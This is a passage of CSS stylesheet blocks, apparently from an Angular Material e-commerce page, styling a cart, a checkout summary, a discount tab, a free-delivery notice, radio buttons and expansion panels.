        font-size: .75rem;
        overflow: hidden;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        text-overflow: ellipsis
      }

      sm-special-discount .mdc-tab[aria-selected=false] span {
        font-size: .75rem;
        color: var(--basicColor900)
      }

      sm-special-discount .mat-mdc-tab-header {
        margin-bottom: 1rem
      }

      sm-special-discount .mat-mdc-tab-labels [aria-selected=true] {
        font-weight: bolder;
        font-size: .875rem
      }

      sm-special-discount .mat-mdc-tab-list {
        width: 0;
        border-bottom: solid 1px rgba(0, 0, 0, .12)
      }

      sm-special-discount .mat-mdc-tab-header-pagination {
        background: var(--basicColor200);
        width: 1.625rem;
        min-width: 1.625rem
      }

      sm-special-discount .mat-mdc-tab-header-pagination.mat-mdc-tab-header-pagination-disabled {
        display: none !important
      }

      sm-special-discount .mat-mdc-tab-body-content .flickity-viewport {
        min-height: 150px !important
      }

      sm-special-discount fe-carousel .any-carousel {
        max-height: 9rem
      }
    </style>
    <style>
      .card[_ngcontent-isc-c396] {
        border-radius: .5rem;
        box-shadow: none;
        margin-bottom: 1rem;
        background-color: #ffc2003d
      }

      .card[_ngcontent-isc-c396] .container[_ngcontent-isc-c396] {
        align-items: center;
        display: flex;
        padding: .75rem
      }

      .card[_ngcontent-isc-c396] .container[_ngcontent-isc-c396] .image[_ngcontent-isc-c396] {
        height: 32px;
        margin-right: .75rem;
        width: 36px
      }

      .card[_ngcontent-isc-c396] .container[_ngcontent-isc-c396] .description[_ngcontent-isc-c396] {
        font-size: .75rem;
        width: -moz-fit-content;
        width: fit-content
      }

      .card[_ngcontent-isc-c396] .sm-free-delivery[_ngcontent-isc-c396] {
        border-radius: .5rem;
        border: 1px solid #c1edc7;
        background: #e3fde6;
        color: var(--systemColorSuccess600)
      }
    </style>
    <style>
      [_nghost-isc-c259] {
        display: block
      }
    </style>
    <style>
      fe-line-checkout-summary-mobile .checkout-summary-mobile__container {
        border-top: solid 1px rgba(0, 0, 0, .12);
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: white;
        z-index: 3;
        padding: 1rem
      }

      fe-line-checkout-summary-mobile .checkout-summary-mobile__container.with-details {
        padding: 0
      }

      fe-line-checkout-summary-mobile .checkout-summary-mobile__container.with-details sm-alternative-product-choice {
        margin-bottom: 0
      }

      fe-line-checkout-summary-mobile .checkout-summary-mobile__container.popup-visible {
        bottom: 2.875rem
      }

      fe-line-checkout-summary-mobile .checkout-summary-mobile__content {
        display: flex;
        justify-content: space-between
      }

      fe-line-checkout-summary-mobile .checkout-summary-mobile__content .revenue-container {
        flex-grow: 9;
        align-self: center
      }

      fe-line-checkout-summary-mobile .checkout-summary-mobile__content .revenue-container .revenue {
        margin: .2rem 0 0;
        color: var(--brandColorPrimary700)
      }

      fe-line-checkout-summary-mobile .checkout-summary-mobile__content .confirm-button {
        flex-grow: 12;
        height: 3.125rem
      }

      fe-line-checkout-summary-mobile .checkout-summary-mobile__content .disabled {
        background-color: #f1f2f5 !important;
        color: #00000061 !important;
        -webkit-user-select: none;
        user-select: none
      }

      fe-line-checkout-summary-mobile .mat-expansion-panel {
        display: flex !important;
        flex-direction: column
      }

      fe-line-checkout-summary-mobile .mat-expansion-panel:not([class*=mat-elevation-z]) {
        box-shadow: none
      }

      fe-line-checkout-summary-mobile .mat-expansion-panel .mat-content {
        display: unset
      }

      fe-line-checkout-summary-mobile .mat-expansion-panel-header {
        order: 2;
        padding: .75rem;
        height: 100% !important
      }

      fe-line-checkout-summary-mobile .mat-expansion-panel-header .mat-expansion-indicator {
        color: var(--basicColor900)
      }

      fe-line-checkout-summary-mobile .mat-expansion-panel-body {
        padding: 0
      }

      fe-line-checkout-summary-mobile .mat-expansion-panel .summary-content,
      fe-line-checkout-summary-mobile .mat-expansion-panel .discounts {
        grid-column: 1/3;
        display: grid;
        grid-template-columns: repeat(2, max-content);
        row-gap: .75rem;
        justify-content: space-between
      }

      fe-line-checkout-summary-mobile .mat-expansion-panel .summary-content p,
      fe-line-checkout-summary-mobile .mat-expansion-panel .discounts p {
        margin: 0
      }

      fe-line-checkout-summary-mobile .mat-expansion-panel .summary-content p:nth-child(even),
      fe-line-checkout-summary-mobile .mat-expansion-panel .discounts p:nth-child(even) {
        text-align: right
      }

      fe-line-checkout-summary-mobile .mat-expansion-panel .summary-content {
        padding: .75rem
      }

      fe-line-checkout-summary-mobile .free-delivery-info {
        font-size: .75rem;
        padding: .75rem;
        margin: 1rem;
        border-radius: .5rem;
        border: 1px solid #c1edc7;
        background: #e3fde6;
        color: var(--systemColorSuccess600)
      }

      .mion fe-line-checkout-summary-mobile .checkout-summary-mobile__content .revenue-container .revenue {
        color: var(--basicColor900)
      }
    </style>
    <style>
      .confirm-button[_ngcontent-isc-c257] {
        margin-top: 1rem;
        width: 100%;
        height: auto;
        padding: 1rem
      }
    </style>
    <style>
      [_nghost-isc-c256] {
        display: block
      }

      .container[_ngcontent-isc-c256] {
        box-shadow: none;
        border: solid 1px rgba(0, 0, 0, .12);
        border-radius: .5rem
      }

      .summary[_ngcontent-isc-c256] {
        display: grid;
        grid-template-columns: repeat(2, max-content);
        row-gap: 1rem;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 1rem
      }

      .summary-content[_ngcontent-isc-c256],
      .discounts[_ngcontent-isc-c256] {
        grid-column: 1/3;
        display: grid;
        grid-template-columns: repeat(2, max-content);
        row-gap: .75rem;
        justify-content: space-between
      }

      .summary-content[_ngcontent-isc-c256] p[_ngcontent-isc-c256],
      .discounts[_ngcontent-isc-c256] p[_ngcontent-isc-c256] {
        margin: 0
      }

      .summary-content[_ngcontent-isc-c256] p[_ngcontent-isc-c256]:nth-child(even),
      .discounts[_ngcontent-isc-c256] p[_ngcontent-isc-c256]:nth-child(even) {
        text-align: right
      }

      .discounts[_ngcontent-isc-c256] {
        color: var(--systemColorSuccess600)
      }

      .discounts[_ngcontent-isc-c256] p[_ngcontent-isc-c256]:first-child {
        max-width: 200px
      }

      .delivery-price[_ngcontent-isc-c256] {
        flex-direction: row;
        justify-content: space-between;
        display: grid;
        grid-column: 1/3;
        grid-template-areas: 1/3;
        grid-auto-flow: column
      }

      .free[_ngcontent-isc-c256] {
        margin-left: .25rem
      }

      .side-payment[_ngcontent-isc-c256] {
        display: flex;
        align-items: center
      }

      .side-payment[_ngcontent-isc-c256] button[_ngcontent-isc-c256] {
        text-decoration: underline;
        height: auto
      }
    </style>
    <style>
      .mat-divider {
        display: block;
        margin: 0;
        border-top-width: 1px;
        border-top-style: solid
      }

      .mat-divider.mat-divider-vertical {
        border-top: 0;
        border-right-width: 1px;
        border-right-style: solid
      }

      .mat-divider.mat-divider-inset {
        margin-left: 80px
      }

      [dir=rtl] .mat-divider.mat-divider-inset {
        margin-left: auto;
        margin-right: 80px
      }
    </style>
    <style>
      .mat-card {
        transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
        display: block;
        position: relative;
        padding: 16px;
        border-radius: 4px
      }

      .mat-card._mat-animation-noopable {
        transition: none !important;
        animation: none !important
      }

      .mat-card>.mat-divider-horizontal {
        position: absolute;
        left: 0;
        width: 100%
      }

      [dir=rtl] .mat-card>.mat-divider-horizontal {
        left: auto;
        right: 0
      }

      .mat-card>.mat-divider-horizontal.mat-divider-inset {
        position: static;
        margin: 0
      }

      [dir=rtl] .mat-card>.mat-divider-horizontal.mat-divider-inset {
        margin-right: 0
      }

      .cdk-high-contrast-active .mat-card {
        outline: solid 1px
      }

      .mat-card-actions,
      .mat-card-subtitle,
      .mat-card-content {
        display: block;
        margin-bottom: 16px
      }

      .mat-card-title {
        display: block;
        margin-bottom: 8px
      }

      .mat-card-actions {
        margin-left: -8px;
        margin-right: -8px;
        padding: 8px 0
      }

      .mat-card-actions-align-end {
        display: flex;
        justify-content: flex-end
      }

      .mat-card-image {
        width: calc(100% + 32px);
        margin: 0 -16px 16px -16px;
        display: block;
        overflow: hidden
      }

      .mat-card-image img {
        width: 100%
      }

      .mat-card-footer {
        display: block;
        margin: 0 -16px -16px -16px
      }

      .mat-card-actions .mat-button,
      .mat-card-actions .mat-raised-button,
      .mat-card-actions .mat-stroked-button {
        margin: 0 8px
      }

      .mat-card-header {
        display: flex;
        flex-direction: row
      }

      .mat-card-header .mat-card-title {
        margin-bottom: 12px
      }

      .mat-card-header-text {
        margin: 0 16px
      }

      .mat-card-avatar {
        height: 40px;
        width: 40px;
        border-radius: 50%;
        flex-shrink: 0;
        object-fit: cover
      }

      .mat-card-title-group {
        display: flex;
        justify-content: space-between
      }

      .mat-card-sm-image {
        width: 80px;
        height: 80px
      }

      .mat-card-md-image {
        width: 112px;
        height: 112px
      }

      .mat-card-lg-image {
        width: 152px;
        height: 152px
      }

      .mat-card-xl-image {
        width: 240px;
        height: 240px;
        margin: -8px
      }

      .mat-card-title-group>.mat-card-xl-image {
        margin: -8px 0 8px
      }

      @media(max-width: 599px) {
        .mat-card-title-group {
          margin: 0
        }

        .mat-card-xl-image {
          margin-left: 0;
          margin-right: 0
        }
      }

      .mat-card>:first-child,
      .mat-card-content>:first-child {
        margin-top: 0
      }

      .mat-card>:last-child:not(.mat-card-footer),
      .mat-card-content>:last-child:not(.mat-card-footer) {
        margin-bottom: 0
      }

      .mat-card-image:first-child {
        margin-top: -16px;
        border-top-left-radius: inherit;
        border-top-right-radius: inherit
      }

      .mat-card>.mat-card-actions:last-child {
        margin-bottom: -8px;
        padding-bottom: 0
      }

      .mat-card-actions:not(.mat-card-actions-align-end) .mat-button:first-child,
      .mat-card-actions:not(.mat-card-actions-align-end) .mat-raised-button:first-child,
      .mat-card-actions:not(.mat-card-actions-align-end) .mat-stroked-button:first-child {
        margin-left: 0;
        margin-right: 0
      }

      .mat-card-actions-align-end .mat-button:last-child,
      .mat-card-actions-align-end .mat-raised-button:last-child,
      .mat-card-actions-align-end .mat-stroked-button:last-child {
        margin-left: 0;
        margin-right: 0
      }

      .mat-card-title:not(:first-child),
      .mat-card-subtitle:not(:first-child) {
        margin-top: -4px
      }

      .mat-card-header .mat-card-subtitle:not(:first-child) {
        margin-top: -8px
      }

      .mat-card>.mat-card-xl-image:first-child {
        margin-top: -8px
      }

      .mat-card>.mat-card-xl-image:last-child {
        margin-bottom: -8px
      }
    </style>
    <style>
      sm-alternative-product-choice {
        display: block
      }

      sm-alternative-product-choice .cart-choice-box {
        padding: 1rem;
        border-radius: 8px;
        border: solid 1px rgba(0, 0, 0, .12)
      }

      sm-alternative-product-choice .cart-choice-box .header {
        display: flex;
        justify-content: space-between;
        align-items: center
      }

      sm-alternative-product-choice .cart-choice-box .header fa-icon {
        font-size: 1.25rem;
        padding: .25rem
      }

      sm-alternative-product-choice .cart-choice-box .description {
        display: block
      }

      sm-alternative-product-choice .cart-choice-box mat-radio-button {
        margin-top: .75rem;
        display: block
      }

      sm-alternative-product-choice .cart-choice-box mat-radio-button span {
        cursor: pointer
      }

      sm-alternative-product-choice .cart-choice-box .mat-mdc-radio-button .mdc-radio {
        padding-left: 0
      }
    </style>
    <style>
      .alternative-product-choice-container[_ngcontent-isc-c380] {
        position: relative;
        border: solid 1px rgba(0, 0, 0, .12);
        border-radius: .5rem;
        padding: 1rem;
        margin-top: 1rem
      }

      .content[_ngcontent-isc-c380] {
        display: inline-flex
      }

      .content[_ngcontent-isc-c380] fa-icon[_ngcontent-isc-c380] {
        font-size: 1.5rem
      }

      .content[_ngcontent-isc-c380] .description[_ngcontent-isc-c380] {
        margin-left: .65rem
      }

      .content[_ngcontent-isc-c380] .description[_ngcontent-isc-c380] button[_ngcontent-isc-c380] {
        height: -moz-fit-content;
        height: fit-content;
        padding: .125rem;
        font-size: .75rem
      }

      .content[_ngcontent-isc-c380] .sub-caption[_ngcontent-isc-c380] {
        display: block;
        margin-top: .25rem
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      sm-cart-page-item {
        display: block
      }

      sm-cart-page-item .cart-page-item {
        display: grid;
        grid-auto-flow: column;
        grid-gap: .5rem;
        padding: .875rem;
        grid-template-columns: 5.325rem 4fr 1fr
      }

      sm-cart-page-item .cart-page-item.no-image {
        display: flex
      }

      @media (max-width: 768px) {
        sm-cart-page-item .cart-page-item {
          grid-template-columns: 4.25rem 1fr
        }
      }

      sm-cart-page-item .cart-page-item .product-name {
        display: flex;
        flex-flow: column;
        place-content: space-between;
        width: 100%;
        white-space: normal;
        z-index: 2
      }

      sm-cart-page-item .cart-page-item .product-name .actions .note,
      sm-cart-page-item .cart-page-item .product-name .actions .remove {
        display: inline;
        cursor: pointer
      }

      sm-cart-page-item .cart-page-item .product-name .actions .note fa-icon,
      sm-cart-page-item .cart-page-item .product-name .actions .remove fa-icon {
        margin-right: .375rem;
        font-size: .875rem
      }

      sm-cart-page-item .cart-page-item .product-name .actions .remove {
        margin-left: 1.5rem
      }

      sm-cart-page-item .cart-page-item .product-name .actions .edit {
        color: var(--systemColorSuccess600)
      }

      sm-cart-page-item .cart-page-item .product-name .actions.no-image-mobile {
        margin-top: 1rem
      }

      sm-cart-page-item .cart-page-item .product-name .actions.no-image-mobile .popover-content {
        left: 0
      }

      sm-cart-page-item .cart-page-item .product-name .description {
        margin-top: .5rem
      }

      @media (max-width: 768px) {
        sm-cart-page-item .cart-page-item .product-name .description {
          margin-bottom: .5rem
        }
      }

      sm-cart-page-item .cart-page-item .product-price {
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        justify-self: right;
        z-index: 2;
        align-items: flex-end
      }

      @media (max-width: 768px) {
        sm-cart-page-item .cart-page-item .product-price {
          display: inline-flex;
          flex-direction: row;
          margin-top: 1rem
        }
      }

      sm-cart-page-item .cart-page-item fe-product-labels {
        margin: 0 0 .875rem
      }

      sm-cart-page-item .cart-page-item .popover-trigger {
        cursor: pointer
      }

      sm-cart-page-item .cart-page-item .popover-trigger fa-icon {
        margin-right: .375rem;
        font-size: .875rem
      }

      sm-cart-page-item .cart-page-item .no-installment-info {
        display: flex;
        align-items: center;
        margin-top: 8px
      }

      sm-cart-page-item .cart-page-item .no-installment-info .no-installment {
        font-size: 12px;
        font-weight: 400;
        color: var(--basicColorBlue)
      }

      sm-cart-page-item .cart-page-item .no-installment-info .info-icon {
        color: var(--basicColorBlue);
        margin-right: 4px
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .popover-wrapper[_ngcontent-isc-c381] {
        position: relative;
        margin-top: 1.5rem;
        display: inline-block;
        z-index: 3
      }

      .popover-content[_ngcontent-isc-c381] {
        position: absolute;
        padding: .75rem;
        transform: translateY(-7rem);
        width: 18rem;
        height: 5rem;
        border-radius: 5px;
        box-shadow: 0 2px 9px #00000036;
        border: solid 1px var(--brandColorPrimary700);
        background-color: var(--basicColorWhite)
      }

      @media (max-width: 576px) {
        .popover-content[_ngcontent-isc-c381] {
          left: -5rem
        }
      }

      .popover-content[_ngcontent-isc-c381] form[_ngcontent-isc-c381] {
        width: 100%
      }

      .popover-content[_ngcontent-isc-c381] form[_ngcontent-isc-c381] textarea[_ngcontent-isc-c381] {
        font-size: .75rem;
        width: 100%;
        border: none;
        outline: none;
        resize: none
      }

      .popover-actions[_ngcontent-isc-c381] {
        float: right;
        display: block
      }

      .popover-actions[_ngcontent-isc-c381] button[_ngcontent-isc-c381] {
        height: -moz-fit-content;
        height: fit-content
      }

      .popover-actions[_ngcontent-isc-c381] button[disabled][_ngcontent-isc-c381] {
        color: #00000029
      }
    </style>
    <style>
      .mdc-radio {
        display: inline-block;
        position: relative;
        flex: 0 0 auto;
        box-sizing: content-box;
        width: 20px;
        height: 20px;
        cursor: pointer;
        will-change: opacity, transform, border-color, color
      }

      .mdc-radio__background {
        display: inline-block;
        position: relative;
        box-sizing: border-box;
        width: 20px;
        height: 20px
      }

      .mdc-radio__background::before {
        position: absolute;
        transform: scale(0, 0);
        border-radius: 50%;
        opacity: 0;
        pointer-events: none;
        content: "";
        transition: opacity 120ms 0ms cubic-bezier(0.4, 0, 0.6, 1), transform 120ms 0ms cubic-bezier(0.4, 0, 0.6, 1)
      }

      .mdc-radio__outer-circle {
        position: absolute;
        top: 0;
        left: 0;
        box-sizing: border-box;
        width: 100%;
        height: 100%;
        border-width: 2px;
        border-style: solid;
        border-radius: 50%;
        transition: border-color 120ms 0ms cubic-bezier(0.4, 0, 0.6, 1)
      }

      .mdc-radio__inner-circle {
        position: absolute;
        top: 0;
        left: 0;
        box-sizing: border-box;
        width: 100%;
        height: 100%;
        transform: scale(0, 0);
        border-width: 10px;
        border-style: solid;
        border-radius: 50%;
        transition: transform 120ms 0ms cubic-bezier(0.4, 0, 0.6, 1), border-color 120ms 0ms cubic-bezier(0.4, 0, 0.6, 1)
      }

      .mdc-radio__native-control {
        position: absolute;
        margin: 0;
        padding: 0;
        opacity: 0;
        cursor: inherit;
        z-index: 1
      }

      .mdc-radio--touch {
        margin-top: 4px;
        margin-bottom: 4px;
        margin-right: 4px;
        margin-left: 4px
      }

      .mdc-radio--touch .mdc-radio__native-control {
        top: calc((40px - 48px) / 2);
        right: calc((40px - 48px) / 2);
        left: calc((40px - 48px) / 2);
        width: 48px;
        height: 48px
      }

      .mdc-radio.mdc-ripple-upgraded--background-focused .mdc-radio__focus-ring,
      .mdc-radio:not(.mdc-ripple-upgraded):focus .mdc-radio__focus-ring {
        pointer-events: none;
        border: 2px solid rgba(0, 0, 0, 0);
        border-radius: 6px;
        box-sizing: content-box;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        height: 100%;
        width: 100%
      }

      @media screen and (forced-colors: active) {

        .mdc-radio.mdc-ripple-upgraded--background-focused .mdc-radio__focus-ring,
        .mdc-radio:not(.mdc-ripple-upgraded):focus .mdc-radio__focus-ring {
          border-color: CanvasText
        }
      }

      .mdc-radio.mdc-ripple-upgraded--background-focused .mdc-radio__focus-ring::after,
      .mdc-radio:not(.mdc-ripple-upgraded):focus .mdc-radio__focus-ring::after {
        content: "";
        border: 2px solid rgba(0, 0, 0, 0);
        border-radius: 8px;
        display: block;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        height: calc(100% + 4px);
        width: calc(100% + 4px)
      }

      @media screen and (forced-colors: active) {

        .mdc-radio.mdc-ripple-upgraded--background-focused .mdc-radio__focus-ring::after,
        .mdc-radio:not(.mdc-ripple-upgraded):focus .mdc-radio__focus-ring::after {
          border-color: CanvasText
        }
      }

      .mdc-radio__native-control:checked+.mdc-radio__background,
      .mdc-radio__native-control:disabled+.mdc-radio__background {
        transition: opacity 120ms 0ms cubic-bezier(0, 0, 0.2, 1), transform 120ms 0ms cubic-bezier(0, 0, 0.2, 1)
      }

      .mdc-radio__native-control:checked+.mdc-radio__background .mdc-radio__outer-circle,
      .mdc-radio__native-control:disabled+.mdc-radio__background .mdc-radio__outer-circle {
        transition: border-color 120ms 0ms cubic-bezier(0, 0, 0.2, 1)
      }

      .mdc-radio__native-control:checked+.mdc-radio__background .mdc-radio__inner-circle,
      .mdc-radio__native-control:disabled+.mdc-radio__background .mdc-radio__inner-circle {
        transition: transform 120ms 0ms cubic-bezier(0, 0, 0.2, 1), border-color 120ms 0ms cubic-bezier(0, 0, 0.2, 1)
      }

      .mdc-radio--disabled {
        cursor: default;
        pointer-events: none
      }

      .mdc-radio__native-control:checked+.mdc-radio__background .mdc-radio__inner-circle {
        transform: scale(0.5);
        transition: transform 120ms 0ms cubic-bezier(0, 0, 0.2, 1), border-color 120ms 0ms cubic-bezier(0, 0, 0.2, 1)
      }

      .mdc-radio__native-control:disabled+.mdc-radio__background,
      [aria-disabled=true] .mdc-radio__native-control+.mdc-radio__background {
        cursor: default
      }

      .mdc-radio__native-control:focus+.mdc-radio__background::before {
        transform: scale(1);
        opacity: .12;
        transition: opacity 120ms 0ms cubic-bezier(0, 0, 0.2, 1), transform 120ms 0ms cubic-bezier(0, 0, 0.2, 1)
      }

      .mdc-form-field {
        display: inline-flex;
        align-items: center;
        vertical-align: middle
      }

      .mdc-form-field>label {
        margin-left: 0;
        margin-right: auto;
        padding-left: 4px;
        padding-right: 0;
        order: 0
      }

      [dir=rtl] .mdc-form-field>label,
      .mdc-form-field>label[dir=rtl] {
        margin-left: auto;
        margin-right: 0
      }

      [dir=rtl] .mdc-form-field>label,
      .mdc-form-field>label[dir=rtl] {
        padding-left: 0;
        padding-right: 4px
      }

      .mdc-form-field--nowrap>label {
        text-overflow: ellipsis;
        overflow: hidden;
        white-space: nowrap
      }

      .mdc-form-field--align-end>label {
        margin-left: auto;
        margin-right: 0;
        padding-left: 0;
        padding-right: 4px;
        order: -1
      }

      [dir=rtl] .mdc-form-field--align-end>label,
      .mdc-form-field--align-end>label[dir=rtl] {
        margin-left: 0;
        margin-right: auto
      }

      [dir=rtl] .mdc-form-field--align-end>label,
      .mdc-form-field--align-end>label[dir=rtl] {
        padding-left: 4px;
        padding-right: 0
      }

      .mdc-form-field--space-between {
        justify-content: space-between
      }

      .mdc-form-field--space-between>label {
        margin: 0
      }

      [dir=rtl] .mdc-form-field--space-between>label,
      .mdc-form-field--space-between>label[dir=rtl] {
        margin: 0
      }

      .mat-mdc-radio-button .mdc-radio {
        padding: calc((var(--mdc-radio-state-layer-size, 40px) - 20px) / 2)
      }

      .mat-mdc-radio-button .mdc-radio [aria-disabled=true] .mdc-radio__native-control:checked+.mdc-radio__background .mdc-radio__outer-circle,
      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control:disabled:checked+.mdc-radio__background .mdc-radio__outer-circle {
        border-color: var(--mdc-radio-disabled-selected-icon-color, #000)
      }

      .mat-mdc-radio-button .mdc-radio [aria-disabled=true] .mdc-radio__native-control+.mdc-radio__background .mdc-radio__inner-circle,
      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control:disabled+.mdc-radio__background .mdc-radio__inner-circle {
        border-color: var(--mdc-radio-disabled-selected-icon-color, #000)
      }

      .mat-mdc-radio-button .mdc-radio [aria-disabled=true] .mdc-radio__native-control:checked+.mdc-radio__background .mdc-radio__outer-circle,
      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control:disabled:checked+.mdc-radio__background .mdc-radio__outer-circle {
        opacity: var(--mdc-radio-disabled-selected-icon-opacity, 0.38)
      }

      .mat-mdc-radio-button .mdc-radio [aria-disabled=true] .mdc-radio__native-control+.mdc-radio__background .mdc-radio__inner-circle,
      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control:disabled+.mdc-radio__background .mdc-radio__inner-circle {
        opacity: var(--mdc-radio-disabled-selected-icon-opacity, 0.38)
      }

      .mat-mdc-radio-button .mdc-radio [aria-disabled=true] .mdc-radio__native-control:not(:checked)+.mdc-radio__background .mdc-radio__outer-circle,
      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control:disabled:not(:checked)+.mdc-radio__background .mdc-radio__outer-circle {
        border-color: var(--mdc-radio-disabled-unselected-icon-color, #000)
      }

      .mat-mdc-radio-button .mdc-radio [aria-disabled=true] .mdc-radio__native-control:not(:checked)+.mdc-radio__background .mdc-radio__outer-circle,
      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control:disabled:not(:checked)+.mdc-radio__background .mdc-radio__outer-circle {
        opacity: var(--mdc-radio-disabled-unselected-icon-opacity, 0.38)
      }

      .mat-mdc-radio-button .mdc-radio.mdc-ripple-upgraded--background-focused .mdc-radio__native-control:enabled:checked+.mdc-radio__background .mdc-radio__outer-circle,
      .mat-mdc-radio-button .mdc-radio:not(.mdc-ripple-upgraded):focus .mdc-radio__native-control:enabled:checked+.mdc-radio__background .mdc-radio__outer-circle {
        border-color: var(--mdc-radio-selected-focus-icon-color, #6200ee)
      }

      .mat-mdc-radio-button .mdc-radio.mdc-ripple-upgraded--background-focused .mdc-radio__native-control:enabled+.mdc-radio__background .mdc-radio__inner-circle,
      .mat-mdc-radio-button .mdc-radio:not(.mdc-ripple-upgraded):focus .mdc-radio__native-control:enabled+.mdc-radio__background .mdc-radio__inner-circle {
        border-color: var(--mdc-radio-selected-focus-icon-color, #6200ee)
      }

      .mat-mdc-radio-button .mdc-radio:hover .mdc-radio__native-control:enabled:checked+.mdc-radio__background .mdc-radio__outer-circle {
        border-color: var(--mdc-radio-selected-hover-icon-color, #6200ee)
      }

      .mat-mdc-radio-button .mdc-radio:hover .mdc-radio__native-control:enabled+.mdc-radio__background .mdc-radio__inner-circle {
        border-color: var(--mdc-radio-selected-hover-icon-color, #6200ee)
      }

      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control:enabled:checked+.mdc-radio__background .mdc-radio__outer-circle {
        border-color: var(--mdc-radio-selected-icon-color, #6200ee)
      }

      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control:enabled+.mdc-radio__background .mdc-radio__inner-circle {
        border-color: var(--mdc-radio-selected-icon-color, #6200ee)
      }

      .mat-mdc-radio-button .mdc-radio:not(:disabled):active .mdc-radio__native-control:enabled:checked+.mdc-radio__background .mdc-radio__outer-circle {
        border-color: var(--mdc-radio-selected-pressed-icon-color, #6200ee)
      }

      .mat-mdc-radio-button .mdc-radio:not(:disabled):active .mdc-radio__native-control:enabled+.mdc-radio__background .mdc-radio__inner-circle {
        border-color: var(--mdc-radio-selected-pressed-icon-color, #6200ee)
      }

      .mat-mdc-radio-button .mdc-radio:hover .mdc-radio__native-control:enabled:not(:checked)+.mdc-radio__background .mdc-radio__outer-circle {
        border-color: var(--mdc-radio-unselected-hover-icon-color, #000)
      }

      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control:enabled:not(:checked)+.mdc-radio__background .mdc-radio__outer-circle {
        border-color: var(--mdc-radio-unselected-icon-color, #000)
      }

      .mat-mdc-radio-button .mdc-radio:not(:disabled):active .mdc-radio__native-control:enabled:not(:checked)+.mdc-radio__background .mdc-radio__outer-circle {
        border-color: var(--mdc-radio-unselected-pressed-icon-color, #000)
      }

      .mat-mdc-radio-button .mdc-radio .mdc-radio__background::before {
        top: calc(-1 * (var(--mdc-radio-state-layer-size, 40px) - 20px) / 2);
        left: calc(-1 * (var(--mdc-radio-state-layer-size, 40px) - 20px) / 2);
        width: var(--mdc-radio-state-layer-size, 40px);
        height: var(--mdc-radio-state-layer-size, 40px)
      }

      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control {
        top: calc((var(--mdc-radio-state-layer-size, 40px) - var(--mdc-radio-state-layer-size, 40px)) / 2);
        right: calc((var(--mdc-radio-state-layer-size, 40px) - var(--mdc-radio-state-layer-size, 40px)) / 2);
        left: calc((var(--mdc-radio-state-layer-size, 40px) - var(--mdc-radio-state-layer-size, 40px)) / 2);
        width: var(--mdc-radio-state-layer-size, 40px);
        height: var(--mdc-radio-state-layer-size, 40px)
      }

      .mat-mdc-radio-button .mdc-radio .mdc-radio__background::before {
        background-color: var(--mat-mdc-radio-ripple-color, transparent)
      }

      .mat-mdc-radio-button .mdc-radio:hover .mdc-radio__native-control:not([disabled]):not(:focus)~.mdc-radio__background::before {
        opacity: .04;
        transform: scale(1)
      }

      .mat-mdc-radio-button.mat-mdc-radio-checked .mdc-radio__background::before {
        background-color: var(--mat-mdc-radio-checked-ripple-color, transparent)
      }

      .mat-mdc-radio-button.mat-mdc-radio-checked .mat-ripple-element {
        background-color: var(--mat-mdc-radio-checked-ripple-color, transparent)
      }

      .mat-mdc-radio-button .mat-radio-ripple {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        pointer-events: none;
        border-radius: 50%
      }

      .mat-mdc-radio-button .mat-radio-ripple .mat-ripple-element {
        opacity: .14
      }

      .mat-mdc-radio-button .mat-radio-ripple::before {
        border-radius: 50%
      }

      .mat-mdc-radio-button._mat-animation-noopable .mdc-radio__background::before,
      .mat-mdc-radio-button._mat-animation-noopable .mdc-radio__outer-circle,
      .mat-mdc-radio-button._mat-animation-noopable .mdc-radio__inner-circle {
        transition: none !important
      }

      .mat-mdc-radio-button .mdc-radio .mdc-radio__native-control:focus:enabled:not(:checked)~.mdc-radio__background .mdc-radio__outer-circle {
        border-color: var(--mdc-radio-unselected-focus-icon-color, black)
      }

      .mat-mdc-radio-button.cdk-focused .mat-mdc-focus-indicator::before {
        content: ""
      }

      .mat-mdc-radio-touch-target {
        position: absolute;
        top: 50%;
        height: 48px;
        left: 50%;
        width: 48px;
        transform: translate(-50%, -50%)
      }

      [dir=rtl] .mat-mdc-radio-touch-target {
        left: 0;
        right: 50%;
        transform: translate(50%, -50%)
      }
    </style>
    <style>
      .mat-expansion-panel {
        box-sizing: content-box;
        display: block;
        margin: 0;
        border-radius: 4px;
        overflow: hidden;
        transition: margin 225ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
        position: relative
      }

      .mat-accordion .mat-expansion-panel:not(.mat-expanded),
      .mat-accordion .mat-expansion-panel:not(.mat-expansion-panel-spacing) {
        border-radius: 0
      }

      .mat-accordion .mat-expansion-panel:first-of-type {
        border-top-right-radius: 4px;
        border-top-left-radius: 4px
      }

      .mat-accordion .mat-expansion-panel:last-of-type {
        border-bottom-right-radius: 4px;
        border-bottom-left-radius: 4px
      }

      .cdk-high-contrast-active .mat-expansion-panel {
        outline: solid 1px
      }

      .mat-expansion-panel.ng-animate-disabled,
      .ng-animate-disabled .mat-expansion-panel,
      .mat-expansion-panel._mat-animation-noopable {
        transition: none
      }

      .mat-expansion-panel-content {
        display: flex;
        flex-direction: column;
        overflow: visible
      }

      .mat-expansion-panel-content[style*="visibility: hidden"] * {
